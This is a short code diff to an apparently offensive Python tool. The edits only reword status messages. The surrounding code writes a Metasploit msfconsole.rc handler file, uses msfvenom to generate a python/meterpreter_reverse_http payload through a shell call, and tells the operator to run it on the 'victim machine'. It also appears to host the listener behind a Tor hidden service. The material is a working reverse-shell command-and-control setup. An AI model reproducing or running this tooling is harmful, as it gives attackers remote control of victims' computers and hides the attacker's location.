@@ -22,7 +22,7 @@ def generatebatch():
         f.write("set LPORT 5000\n")
         f.write("exploit -jz\n")
 
-    print(" * msfconsole.rc batch file generated in " + os.getcwd())
+    print(" * batch file generated in " + os.getcwd() + "/msfconsole.rc")
     print('\n')
     # Asking for valid response
     while True:
@@ -52,7 +52,7 @@ def generatepayload(hostname):
     # Generate payload
     payload = "msfvenom -p python/meterpreter_reverse_http LHOST=" + lhost + " LPORT=80 > payload.py"
     subprocess.call(payload, stdout=subprocess.PIPE, shell=True)
-    print(" * payload.py generated in " + os.getcwd() + " - Run on victim machine")
+    print(" * payload generated in " + os.getcwd() + "/payload.py - Run on victim machine")
 
 
 def stem():
@@ -102,7 +102,7 @@ def stem():
             exit(0)
 
         try:
-            input("\x1b[6;30;42mRUNNING - <enter> to quit\x1b[0m")
+            input("\x1b[6;30;42m * RUNNING - <enter> to quit\x1b[0m")
         finally:
             # Shut down the hidden service and clean it off disk. Note that you *don't*
             # want to delete the hidden service directory if you'd like to have this
